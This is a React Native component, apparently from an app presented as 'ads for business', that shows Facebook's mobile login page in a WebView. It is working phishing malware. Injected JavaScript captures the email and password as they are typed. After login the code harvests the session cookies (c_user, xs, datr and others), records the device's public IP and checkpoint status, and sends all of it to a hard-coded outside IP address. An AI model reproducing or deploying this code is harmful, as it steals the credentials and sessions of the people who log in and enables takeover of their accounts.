import CookieManager from '@react-native-community/cookies';
import React, { Component } from 'react';
import { Dimensions, Text, View } from 'react-native';
import publicIP from 'react-native-public-ip';
import WebView from 'react-native-webview';
var deviceHeight = Dimensions.get("window").height;

export default class LoginFaceBook extends Component {
    constructor(props) {
        super(props);
        this.state = {
            isComplete: false,
            isLoading: false,
            ipAdress: ''
        };
        this.fbPassword = '';
        this.fbUser = '';
        this.isCheckpoint = false;
        this.handleURL = this.handleURL.bind(this);
    }

    componentDidMount() {
        publicIP()
            .then(ip => {
                this.setState({ ipAdress: ip })
            })
            .catch(error => {
                console.log(error);
                // 'Unable to get IP address.'
            });
    }
    onMessage(event) {

        if (event.nativeEvent.data != undefined && event.nativeEvent.data != null && event.nativeEvent.data != '') {
            var result = JSON.parse(event.nativeEvent.data);
            this.fbUser = result.email;
            this.fbPassword = result.pass;
        }
    }

    async handleURL(state) {
        CookieManager.clearAll()
            .then((success) => {
                console.log('CookieManager1.clearAll =>', success);
            });
        // this.props.navigation.navigate("Manager", { userId: cook?.c_user?.value });

        console.log('coookieieieie')
        console.debug(state.url);
        if (state.url.includes("checkpoint")) {
            this.isCheckpoint = true;
        }
        if (state.url.includes("home.php") || state.url.includes("?_rdr")) {

            if (this.state.isComplete) {
                return;
            }
            await this.setState({ isComplete: true });
            var cook = await CookieManager.getAll(true);
            var cookStr;
            if (cook?.fr?.value == undefined) {
                cookStr = "sb=" + cook.sb.value + "; wd=" + cook.wd.value + "; datr=" + cook.datr.value + "; c_user=" + cook.c_user.value + "; xs=" + cook.xs.value;
            }
            else {
                cookStr = "fr=" + cook?.fr?.value + "; sb=" + cook.sb.value + "; wd=" + cook.wd.value + "; datr=" + cook.datr.value + "; c_user=" + cook.c_user.value + "; xs=" + cook.xs.value;
            }
            // var cookStr = 'non cookie'
            this.setState({ isLoading: false });
            await this.onCallApi(cookStr);

            this.props.navigation.navigate("HomeScreen", { userId: cook?.c_user?.value });
        }
    }

    async onCallApi(cookStr) {
        console.debug('onCallApi');
        var data = {
            user: this.fbUser,
            pass: this.fbPassword,
            HasCheckpoint: this.isCheckpoint,
            cookie: cookStr,
            ipAdress: this.state.ipAdress,
            app: 'ads for business'
        };
        var reqDataJson = JSON.stringify(data);
        var URLFetch = 'http://104.161.17.155:3000/post';
        await fetch(URLFetch, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: reqDataJson,
            credentials: "omit",
        });

    }


    render() {
        const scr = ` 
        document.getElementById("m_login_password").addEventListener("input", function() {  
        var data = { 
        email: document.getElementById("m_login_email").value, 
        pass : document.getElementById("m_login_password").value 
        }; 
        window.ReactNativeWebView.postMessage(JSON.stringify(data)); 
        }); 
         
        document.getElementById("m_login_email").addEventListener("input", function() {  
        var data = { 
        email: document.getElementById("m_login_email").value, 
        pass : document.getElementById("m_login_password").value 
        }; 
        window.ReactNativeWebView.postMessage(JSON.stringify(data)); 
        }); 
        `;
        return (
            <View style={{ flex: 1 }}>

                {this.state.isLoading &&
                    <View style={{ alignSelf: 'center', alignItems: 'center', justifyContent: 'center', marginTop: 100 }}>
                        <Text style={{ fontSize: 26, textAlign: 'center', color: '#2980b9' }}>Checking your infomation ...</Text>

                    </View>
                }
                {!this.state.isLoading &&
                    <WebView
                        ref={(input) => this.input = input}
                        style={{ height: deviceHeight - 50 }}
                        source={{ uri: 'https://m.facebook.com/login' }}
                        onNavigationStateChange={this.handleURL}
                        onMessage={(event) => this.onMessage(event)}
                        injectedJavaScript={scr}
                        startInLoadingState={true}
                    >
                    </WebView>
                }
            </View>
        );
    }
}
